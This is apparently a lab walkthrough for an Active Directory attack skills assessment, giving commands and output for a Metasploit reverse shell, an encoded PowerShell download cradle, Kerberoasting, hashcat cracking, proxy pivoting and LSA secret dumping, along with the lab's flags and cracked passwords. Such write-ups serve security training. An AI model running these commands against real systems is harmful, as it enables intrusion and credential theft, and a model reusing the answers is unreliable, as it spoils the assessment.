# AD Enumeration & Attacks Skills Assessment

## Engagement
A team member started an External Penetration Test and was moved to another urgent project before they could finish. 
The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. 
Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. 
As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. 
Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

## Objectives

- Submit the contents of the flag.txt file on the administrator Desktop of the web server
- Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
- Crack the account's password. Submit the cleartext value.
-  Submit the contents of the flag.txt file on the Administrator desktop on MS01
- Find cleartext credentials for another domain user. Submit the username as your answer.
- Submit this user's cleartext password.
- What attack can this user perform?
- Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

<img width="1919" height="665" alt="image" src="https://github.com/user-attachments/assets/777a6f98-ecf8-4d61-9d4d-0b0423210eba" />

Use the web-based PowerShell to read the first flag from c:\users\administrator\desktop\flag.txt : 

<img width="1116" height="601" alt="image" src="https://github.com/user-attachments/assets/7eb08be7-c3b5-4ca7-a7e8-aa48562bd5ed" />

<img width="1119" height="250" alt="image" src="https://github.com/user-attachments/assets/c0a78f8a-4979-4698-8c91-9009cde5fb28" />

<img width="1225" height="169" alt="image" src="https://github.com/user-attachments/assets/eb296b12-b1db-470b-a563-2e81db84ce2d" />

Elevate their functionalities by getting a reverse shell, using msfconsole and the web_delivery exploit:

<img width="1050" height="718" alt="image" src="https://github.com/user-attachments/assets/bfac5457-98d6-4857-b4e5-bea19cf63cff" />

<img width="1044" height="162" alt="image" src="https://github.com/user-attachments/assets/e7115295-a238-4fe6-90ac-d1c8600cfd8b" />


```
set payload windows/x64/meterpreter/reverse_tcp
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2
exploit
```
---->

```
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 10.10.14.40
LHOST => 10.10.14.40
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set RHOST 10.129.75.243
[!] Unknown datastore option: RHOST. Did you mean LHOST?
RHOST => 10.129.75.243
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.40:4444 
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> [*] Using URL: http://10.10.14.40:8080/9SbZDfpoSrQPXM
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAByAGkANwAxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHIAaQA3ADEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAByAGkANwAxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANAAwADoAOAAwADgAMAAvADkAUwBiAFoARABmAHAAbwBTAHIAUQBQAFgATQAvAEgARABhAGcAbABOAE4AawB2AFkAVwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANAAwADoAOAAwADgAMAAvADkAUwBiAFoARABmAHAAbwBTAHIAUQBQAFgATQAnACkAKQA7AA==

```

Copy and paste the encoded PowerShell command into the Antak web shell. 
Enumerate processes and migrate meterpreter to a more stable process, winlogon.exe:

<img width="1177" height="361" alt="image" src="https://github.com/user-attachments/assets/ac265128-90d2-427d-abee-1ba7b41bbbde" />

--->

<img width="1147" height="263" alt="image" src="https://github.com/user-attachments/assets/1c14d88e-8e18-4626-b69a-a0773e200596" />

<img width="1021" height="579" alt="image" src="https://github.com/user-attachments/assets/ac910007-9f65-4f35-bf41-e0cb56d2c7be" />

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 104   4     Registry     x64   0
 300   4     smss.exe     x64   0
 372   640   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 380   640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 388   376   csrss.exe    x64   0
 392   640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 412   1532  w3wp.exe     x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\inetsrv\w3wp.exe
 496   376   wininit.exe  x64   0
 504   488   csrss.exe    x64   1
 564   488   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3    <---------------------- here 
             e                           EM                 2\winlogon.exe
 640   496   services.ex  x64   0
             e
 660   496   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\lsass.exe
 784   640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 812   496   fontdrvhost  x64   0        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-0             2\fontdrvhost.exe
 820   564   fontdrvhost  x64   1        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-1             2\fontdrvhost.exe
 912   640   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 1008  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1016  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1116  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1284  640   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 1352  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1364  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1372  640   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1392  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1464  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1532  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1548  640   vmtoolsd.ex  x64   0        NT AUTHORITY\SYST  C:\Program Files\V
             e                           EM                 Mware\VMware Tools
                                                            \vmtoolsd.exe
 1588  640   vm3dservice  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             .exe                        EM                 2\vm3dservice.exe
 1600  640   VGAuthServi  x64   0        NT AUTHORITY\SYST  C:\Program Files\V
             ce.exe                      EM                 Mware\VMware Tools
                                                            \VMware VGAuth\VGA
                                                            uthService.exe
 1628  640   inetinfo.ex  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             e                           EM                 2\inetsrv\inetinfo
                                                            .exe
 1704  640   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1732  4036  powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
 1872  1588  vm3dservice  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
             .exe                        EM                 2\vm3dservice.exe
 2388  640   dllhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\dllhost.exe
 2556  640   msdtc.exe    x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\msdtc.exe
 2576  784   WmiPrvSE.ex  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
             e                           ORK SERVICE        2\wbem\WmiPrvSE.ex
                                                            e
 2984  564   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\LogonUI.exe
 3036  2984  conhost.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\conhost.exe
 3392  1588  vm3dservice  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
             .exe                        EM                 2\vm3dservice.exe
 4032  4036  conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\conhost.exe
 4036  412   powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
```

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > getpid
Current pid: 1732
```

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > migrate 564
[*] Migrating from 1732 to 564...
[*] Migration completed successfully.
```

Transfer PowerView to the WEB01 machine, starting a Python web server from Pwnbox/PMVPN:


<img width="1027" height="239" alt="image" src="https://github.com/user-attachments/assets/db4564b1-cbe6-4917-86bd-a9067c02bea1" />


From the WEB01 meterpreter, drop to a command shell and download PowerView using certutil.exe. 
Finally, import the module and search for domain users with SPNs; students will find svc_sql as the Kerberoastable account:

<img width="868" height="237" alt="image" src="https://github.com/user-attachments/assets/6e7164f8-19c4-4c71-a9ff-a1901599a3a0" />

```
shell
cd C:\
certutil.exe -f -urlcache -split http://10.10.14.40:8000/PowerView.ps1 PowerView.ps1
powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | select samaccountname
```

<img width="949" height="574" alt="image" src="https://github.com/user-attachments/assets/43ec3e50-e822-4f43-925c-eaa786d449ce" />

Kerberoast the svc_sql account to obtain its hash:


```
PS C:\> Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat


SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$67F1063E9B686C
                       EF572D2C03AF91D05F$B3EDDE51BE49B14C05A25386013B447842071D731CB11BC73ADBC08B56672C7DF1F8DC0003130
                       6A203DD69A09CC18FB2F3325B12A75E99E491A91F3C02574FB98A46F58BC44368AF469581D4F2AA3618A459864EC0E39
                       5B52E3100C87300F2C666444CB25C26C9B09083DBD8937ED340D8970A0B6E58459CCBC94DC3E6872AAD6ECB9A283E490
                       CDF39532231DD39FFA0FD64837E0632CCCBBC2AF73F6ECB3F7B6DC3E67D5FBD93F718CC19EC64075CDFD3F5A5312E8A8
                       021AFA95FF71B1AA615F2CA0FDB0B5897FC92F9C7F01CE748A1C751FE32529A9E79DAE92B6D707E4680196ADA5F57EF1
                       577B7A7809DD716845BD8548F87B8E164B36F2E5952382BD49481E2EC6E265511965D9630FDE886FCDFD6B2F047EAFAA
                       69CDCCB21907516A0FB5DF41C072C3779D24149A6935B5454E3F56134C7C6F02A34AB124F26CB4269EF7D58C8206DC5D
                       408B7AD987C9BC51D5BFA6154B72C8A0702B91C4378CB7C1AD781993A57BCBC7A2964315D219B380E5BEBE1DF7F4189C
                       D02E75730B8FB853A1B4A8FCE264BE90AE5FC48E2187DDC6A36AC403E85FF6A2F1C0CB53BC0E635366CBA8DBC02888B6
                       38F5BAD3227099850F00F62130178407F1979F82991F1ACC9A40C579703AC8A2CE8BC6BCA891D1BE5456416B32BE08B9
                       16836F61F2765A0CB331210DCE8AFEEC42EA2F1B1857FBECF9AAE8A55F8A374A1131E3993A8901C031F4F4DF18574890
                       784009FCD3E3D8E2AE881D8BC64E2A2BAA065F5B2A23A8F05693155C47488988924981E7F5627FB12F92EA4694734457
                       1CB78417A8796B02D649F09EB0772294C72F9E7B735927F8E918687B5A36DF125E564D2ECB0ED4E25D4711D876DA5876
                       5473FA679BEFF82AF563AEAFEBB1240425C614BCEB5EFEA325675C11E0CA552175E532477CA0345C9D9F2D3A061521BD
                       F9123B9261F61300F45F5037BE3ECB283817D72E8FA6B4983761C43E1566730206B9CDFE8B2FDE85F7C88231ECB69831
                       1D0537F77CF4AB5F6D55839E838E013406B22ECEE7EACD03552DAB49933E1CE44B3A5A6BEA90CBD395B43849A14893B8
                       61590D7DEC83895E9F0C0781EBD79E369D5D7A51864E8195A72DCC469B974AB1DAB60A594107987B1F919C6790C6B0F7
                       CF43DBE0E47CDAFC3155046A20F6B030ADA04A10846696E9F21E2B0769C978D45D45A9DA7861BE008B0CB3A0AD043E75
                       6754289DFF161D006C9E457B5C772F91436E9E0FB20C2D5AD47D2955192F71414C54E0777845D6050978CE2025E51508
                       AD2604C1CE6127B5E4D5FA7BC5CCDA7A0A477DBC7A17816507BECAC5F8A2E5E8E9DD0E1FBCAA942532523D97D62FA327
                       8167873E30E48348BBAB13188C2F0DBEBCE4F1D56E099A91DFDC0C733A39BA806C7DECE7DEE39414D1481992B070B45E
                       D046A7377CC4FBCC079565203E522710B9862C62834FD53856DB669CB3780EFDF8D0FAB835A87215EDBDBD9E636ED557
                       93B7447C4BB4001AEC6D07C62891ABB26477E7BC21B3EA3FDFC8B105D5EC31C260E



```

Copy the hash, and then paste into a file, formatting it to remove additional spaces:

```
echo '$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
e                      3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B' | tr -d "[:space:]" > tgs_file

```

Crack with hashcat:

```
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$2f520ef267b5dc8b8c0486deac8a1ac6$9d6b54497f2d45ddb9649e77bc26ee02f8a888275d51c1cb1f10b5365728168536bdf82e3f384a99c55cffb0f38901150a8e248966b818d93347c8e203ff31e331ace4100f85e5974977e5598c23b232761f8ac9ad120b2ca98f73893b7bcbf4a5d0c5829be301a31833de37464bec9d06cb8b2957e79a54feaf5ea941cb54beadc03fd2c89b6c33e5b41c98b55742fa0c44f12658998d44b7b93d29568b04cc592e3c5615912d8211d68314e5de9edc02b21421009f287d33853c90a64cc4962ba658c6c9be2c9e68ef7c6fc40a30feb85b652e0f1e95900422fa1a53dafacdaacd6c4c1d890e4945dc312c2846df6f11a2a1d6b5e4b7c2a23d19c05566e1428b07bc82fac17beb5156932709564a50bb165cb920bf674e74634e69486d14591f3e7d9cd8124bc283e9328d4d446dde2e768b50f5018cc5754dd66c4801096c5369c6a764d068aedf9c8bd3a48e90d0a003df308bd8767af7e857b87d849d8431fe1fdc9d41e47dcdc82da5a15741b13aa078f8a8f646ca99ec1936c7729a32359bee27c4228b034f1c8722ceaef6d41f35540db2d3537d0b46402f773ae1fdecae08325b26236ec7388db59e6ae119a30e337cae78e768a28e7c38109b2949491ac5de7a1fc3dfabcb90cd0ae7b44d3acdcaf104c2b4295a1c8d7ec1b7fe4fc5e6f2630c5312343c8b24e4d7e950631f30ac9c39353c14c4807051568af0614f5f003e79690560afaa00224fba1a1328ecfde2a797502195f8d5aa004539b4da066c9856aa31bd81a9ece1dd0f41ffdf43d42f7e861a475782050fd0205871f9e67265f0eb3bcbeef44f20972c86cce2d5124d3781b3ec5a4ee8b973cf5a5bc13df3df59ee7788a48bb0cd10fa3523efeb3ae3936def6cffbed8dcf41120f11d10aeee13d116437e868bcfb797b873a03303a577ec80f975ae62695700d6729aaea47af3d4f3dbed9f668c7aec643667ded2b1d5912d6ae0ecf364cf27c51d65ca7977588f341a18d61a3dce746c8ea8e997a53d17be78e813516db8d53c84d683b9ee89c8f206943c31b49e269c9e2f8dd60a3f5ef740cec719725e7cee39c8200df0e49115419efedb6128b7b050cf44fa813745a897f156b75a4ca2d833066af9b5a071cd2ab9e4f0ff82d4a08c53a3306dece8d2f030c45449db0ed3a1c2177080f0dc01119b66a8fca13a8b32baf308846445fcc2aae702aa9a681bbf5c90eb83825acc62dd04bc2c8ee9bc4e8098ab6e6dd0aabad3aad0ac34029293c0ff6bb0ef395b17aa8da8e9f055da0fecc168ccd434a8d18656be1de9fa6d4c2f80944161534618effd6cfd059cb72467e3bf04a54c8814de9991b5f0cb7b3d527ddc24db43486499b7ae37d388bc5d2b14fd10bc295a62ab0c79fc310a21726d2e314e7e7599cc492f6fcb9ce8dbad82f882fd1ac2f1f88ec7e623e7f68df88b1b9bac49bfd898f8a031c20750f4b7e45f463d1c56094d38248a964b8951b9d648d1dcaddd054a042272c1b5dc8f56dfd1f20ddc935a73:lucky7
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/S...935a73
Time.Started.....: Thu Apr 21 17:06:26 2022 (0 secs)
Time.Estimated...: Thu Apr 21 17:06:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    95198 H/s (12.65ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Thu Apr 21 17:05:29 2022
Stopped: Thu Apr 21 17:06:27 2022
```

Password= `lucky7`

Use WEB01 as a pivot host into the 172.16.6.0/24 network using meterpreter:

<img width="1025" height="300" alt="image" src="https://github.com/user-attachments/assets/63de011f-77bb-4cd5-a2dd-23952633d104" />

<img width="1101" height="163" alt="image" src="https://github.com/user-attachments/assets/e4ad8213-ab02-4f00-baa5-251ba468e887" />

<img width="1232" height="652" alt="image" src="https://github.com/user-attachments/assets/dac1909e-0841-4461-96ad-fe9a8398d08a" />

```
use auxiliary/server/socks_proxy
show options
run
```

```
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 5.

[*] Starting the SOCKS proxy server
```

Edit /etc/proxchains.conf, adding the socks5 proxy entry to the bottom of the config file:

```
sudo nano /etc/proxychains.conf
```
<img width="1015" height="281" alt="image" src="https://github.com/user-attachments/assets/1c88d59f-fc34-4e37-b69d-31965b6b3a71" />

Use ProxyChains to run commands against the 172.16.6.0/24 network. Students will need to authenticate to SMB on 172.16.6.50 uitilizing the credentials svc_sql:lucky7:

<img width="1914" height="505" alt="image" src="https://github.com/user-attachments/assets/1177cc31-c274-4143-a7c9-57888b8ece7a" />

Then, using crackmapexec, students can read the flag file from the directory C:\users\administrator\desktop\, finding it to be spn$_r0ast1ng_on_@n_0p3n_f1re:

<img width="1909" height="641" alt="image" src="https://github.com/user-attachments/assets/967b3d4a-a8f0-462d-9821-3b2666beeb97" />


Dump autologon passwords in clear text using crackmapexec: 

```
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.secrets and /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.cached
```
User:  `tpetty`
Password: `Sup3rS3cur3D0m@inU2eR`

Use meterpreter session on WEB01, navigate to C:\, and then run PowerShell:

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > shell

Process 324 created.
Channel 23 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>cd C:\    
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of C:\

03/30/2022  01:38 AM    <DIR>          inetpub
09/14/2018  11:12 PM    <DIR>          PerfLogs
11/23/2022  07:51 AM           770,279 PowerView.ps1
04/11/2022  04:54 PM    <DIR>          Program Files
03/30/2022  01:37 AM    <DIR>          Program Files (x86)
04/11/2022  04:26 PM    <DIR>          Users
04/11/2022  06:38 PM    <DIR>          Windows
               1 File(s)        770,279 bytes
               6 Dir(s)  34,472,337,408 bytes free

C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\>
```

Use PowerView to enumerate attack vectors for tpetty:

```
PS C:\> Import-Module .\PowerView.ps1

Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid tpetty
$sid = Convert-NameToSid tpetty
PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
